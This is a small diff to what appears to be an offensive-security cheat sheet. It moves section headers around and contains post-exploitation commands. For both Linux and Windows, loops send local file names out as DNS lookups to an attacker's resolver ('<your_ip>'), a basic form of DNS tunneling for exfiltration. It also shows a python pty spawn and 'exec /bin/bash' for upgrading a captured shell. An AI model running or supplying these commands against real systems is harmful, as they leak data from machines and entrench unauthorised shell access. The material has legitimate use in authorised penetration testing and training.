@@ -1,5 +1,6 @@
-#Basic DNS Tunneling
 #Linux
+
+#Basic DNS Tunneling
 for i in `ls`; do nslookup $i.com <your_ip>; done
 
 #Spawn python pty 
@@ -13,4 +14,6 @@ python -c 'import pty; pty.spawn("/bin/bash")'
 -> exec /bin/bash
 
 #Windows
+
+#Basic DNS Tunneling
 for /F %i in ('dir /B C:\') do nslookup %i.com <your_ip>
